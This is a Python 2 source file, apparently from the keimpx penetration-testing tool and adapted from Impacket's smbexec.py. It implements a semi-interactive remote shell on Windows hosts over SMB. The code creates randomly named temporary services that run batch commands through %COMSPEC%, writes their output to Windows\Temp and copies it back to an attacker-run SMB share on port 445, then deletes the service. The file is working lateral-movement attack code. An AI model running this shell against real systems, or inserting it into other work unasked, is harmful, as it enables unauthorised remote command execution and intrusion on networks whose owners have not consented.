#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-
# -*- Mode: python -*-

from lib.common import *

################################################################
# Code borrowed and adapted from Impacket's smbexec.py example #
################################################################
class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.__smbserver_dir = 'svcshell'
        self.__smbserver_share = 'KEIMPX'

    def cleanup_server(self):
        logger.debug('Cleaning up local SMB server..')
        os.unlink(self.__smbserver_dir + '/smb.log')
        os.rmdir(self.__smbserver_dir)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',self.__smbserver_dir + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(self.__smbserver_share)
        smbConfig.set(self.__smbserver_share,'comment','')
        smbConfig.set(self.__smbserver_share,'read only','no')
        smbConfig.set(self.__smbserver_share,'share type','0')
        smbConfig.set(self.__smbserver_share,'path',self.__smbserver_dir)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0', 445), config_parser = smbConfig)

        logger.debug('Creating tmp directory')

        try:
            os.mkdir(self.__smbserver_dir)
        except Exception, e:
            print e
            pass

        logger.info('Setting up SMB Server')
        self.smb.processConfigFile()
        logger.debug('Ready to listen...')

        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

################################################################
# Code borrowed and adapted from Impacket's smbexec.py example #
################################################################
class SvcShell(cmd.Cmd):
    def __init__(self, svc, mgr_handle, rpc, mode):
        cmd.Cmd.__init__(self)
        self.__svc = svc
        self.__mgr_handle = mgr_handle
        self.__rpc = rpc
        self.__share = 'C$'
        self.__mode = mode
        self.__output_file = '%s.txt' % ''.join([random.choice(string.letters) for _ in range(8)])
        self.__output = ntpath.join('\\', 'Windows', 'Temp', self.__output_file)
        self.__batch_filename = '%s.bat' % ''.join([random.choice(string.letters) for _ in range(8)])
        self.__batchFile = ntpath.join('%TEMP%', self.__batch_filename)
        self.__smbserver_dir = 'svcshell'
        self.__smbserver_share = 'KEIMPX'
        self.__outputBuffer = ''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c'
        self.__service_name = ''.join([random.choice(string.letters) for _ in range(8)]).encode('utf-16le')

        logger.info('Launching semi-interactive shell')
        logger.debug('Going to use temporary service %s' % self.__service_name)

        s = self.__rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on
        s.setTimeout(100000)

        if self.__mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, self.__smbserver_share)

        self.transferClient = self.__rpc.get_smb_connection()
        self.execute_remote('cd ')

        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = string.replace(self.__outputBuffer, '\r\n', '') + '>'
            self.__outputBuffer = ''

    def __output_callback(self, data):
        self.__outputBuffer += data

    def emptyline(self):
        return False

    def default(self, line):
        if line != '':
            self.send_data(line)

    def do_shell(self, cmd):
        process = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
        stdout, _ = process.communicate()

        if stdout is not None:
            print stdout

    def do_exit(self, line):
        return True

    def get_output(self):
        if self.__mode == 'SERVER':
            fd = open(self.__smbserver_dir + '/' + self.__output_file,'r')
            self.__output_callback(fd.read())
            fd.close()
            os.unlink(self.__smbserver_dir + '/' + self.__output_file)
        else:
            self.transferClient.getFile(self.__share, self.__output, self.__output_callback)
            self.transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        command = '%s echo %s ^> %s > %s & %s %s' % (self.__shell, data, self.__output, self.__batchFile, self.__shell, self.__batchFile)

        if self.__mode == 'SERVER':
            command += ' & %s' % self.__copyBack

        command += ' & del %s' % self.__batchFile

        logger.debug('Creating service with executable path: %s' % command)

        resp = self.__svc.CreateServiceW(self.__mgr_handle, self.__service_name, self.__service_name, command.encode('utf-16le'))
        service = resp['ContextHandle']

        try:
           self.__svc.StartServiceW(service)
        except:
           pass

        self.__svc.DeleteService(service)
        self.__svc.CloseServiceHandle(service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print self.__outputBuffer
        self.__outputBuffer = ''
